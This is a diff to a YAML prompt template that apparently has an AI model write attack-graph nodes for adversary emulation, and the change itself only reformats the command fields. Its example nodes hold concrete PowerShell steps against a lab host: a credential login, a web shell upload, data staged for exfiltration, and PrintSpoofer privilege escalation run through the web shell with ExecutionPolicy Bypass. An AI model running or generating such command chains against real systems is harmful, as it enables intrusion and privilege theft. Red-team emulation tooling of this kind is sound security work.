@@ -37,6 +37,12 @@ prompt: |
 
   ## Output Structure
 
+  **IMPORTANT YAML Formatting Rules**:
+  - Use YAML literal block scalar (|) for ALL commands fields to avoid escaping issues
+  - Format: `commands: |` followed by indented command on next line
+  - Do NOT use double quotes for commands
+  - Backslashes and special characters will be preserved correctly
+
   ```yaml
   nodes:
     - id: "node_001"
@@ -54,7 +60,8 @@ prompt: |
           username: "actual username"
           password: "actual password"
         payload: "actual filename"
-        commands: "PowerShell command in single line"  # required for every node; single-line command
+        commands: |
+          PowerShell command in single line (use | literal block scalar)
         # Include ANY other details mentioned
 
   edges:
@@ -87,7 +94,8 @@ prompt: |
       credentials:
         username: "admin"
         password: "P@ssw0rd!2020"
-      commands: "Invoke-WebRequest -Uri 'http://192.168.56.105/login_process.asp' -Method POST -Body @{{userid='admin';password='P@ssw0rd!2020'}} -UseBasicParsing"
+      commands: |
+        Invoke-WebRequest -Uri 'http://192.168.56.105/login_process.asp' -Method POST -Body @{{userid='admin';password='P@ssw0rd!2020'}} -UseBasicParsing
 
   - id: "node_002"
     name: "Upload Web Shell"
@@ -98,7 +106,8 @@ prompt: |
       url: "http://192.168.56.105/upload_handler.asp"
       method: "POST"
       form_field: "file"
-      commands: "Invoke-WebRequest -Uri 'http://192.168.56.105/upload_handler.asp' -Method POST -InFile .\\cmd.asp -ContentType 'multipart/form-data' -UseBasicParsing"
+      commands: |
+        Invoke-WebRequest -Uri 'http://192.168.56.105/upload_handler.asp' -Method POST -InFile .\cmd.asp -ContentType 'multipart/form-data' -UseBasicParsing
   ```
 
   **Example 2: Using native OS tools (commands included)**
@@ -113,7 +122,8 @@ prompt: |
     tactic: "exfiltration"
     description: "Compress data using Windows built-in tools"
     environment_specific:
-      commands: "Compress-Archive -Path C:\\Windows\\Temp\\exfil\\* -DestinationPath C:\\Windows\\Temp\\data.zip"
+      commands: |
+        Compress-Archive -Path C:\Windows\Temp\exfil\* -DestinationPath C:\Windows\Temp\data.zip
       tool: "PowerShell Compress-Archive"  # 2nd priority: native tool
   ```
 
@@ -129,7 +139,8 @@ prompt: |
     tactic: "credential-access"
     description: "Simulate keylogger deployment"
     environment_specific:
-      commands: "echo 'keylogger stub' > C:\\Windows\\Temp\\perfcon.dat; Write-Output 'Keylogger installed (simulated)'"
+      commands: |
+        echo 'keylogger stub' > C:\Windows\Temp\perfcon.dat; Write-Output 'Keylogger installed (simulated)'
       simulation: true  # 3rd priority: stub simulation
   ```
 
@@ -145,7 +156,8 @@ prompt: |
     description: "Copy privilege escalation tools from agent working directory to web-accessible directory"
     environment_specific:
       payloads: ["PrintSpoofer64.exe", "vcruntime140.dll", "deploy.ps1"]
-      commands: "Copy-Item -Path 'PrintSpoofer64.exe' -Destination 'C:\\inetpub\\wwwroot\\uploads\\PrintSpoofer64.exe' -Force; Copy-Item -Path 'vcruntime140.dll' -Destination 'C:\\inetpub\\wwwroot\\uploads\\vcruntime140.dll' -Force; Copy-Item -Path 'deploy.ps1' -Destination 'C:\\inetpub\\wwwroot\\uploads\\deploy.ps1' -Force"
+      commands: |
+        Copy-Item -Path 'PrintSpoofer64.exe' -Destination 'C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe' -Force; Copy-Item -Path 'vcruntime140.dll' -Destination 'C:\inetpub\wwwroot\uploads\vcruntime140.dll' -Force; Copy-Item -Path 'deploy.ps1' -Destination 'C:\inetpub\wwwroot\uploads\deploy.ps1' -Force
 
   - id: "node_007"
     name: "Execute Privilege Escalation"
@@ -155,7 +167,8 @@ prompt: |
       url: "http://192.168.56.105/uploads/cmd.asp"
       method: "GET"
       exploit: "PrintSpoofer64.exe"
-      commands: "Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=C:\\inetpub\\wwwroot\\uploads\\PrintSpoofer64.exe -c \"powershell.exe -ExecutionPolicy Bypass -File C:\\inetpub\\wwwroot\\uploads\\deploy.ps1\"' -UseBasicParsing"
+      commands: |
+        Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe -c "powershell.exe -ExecutionPolicy Bypass -File C:\inetpub\wwwroot\uploads\deploy.ps1"' -UseBasicParsing
   ```
 
   **Note**: Technique IDs will be added automatically in post-processing using mitreattack-python.
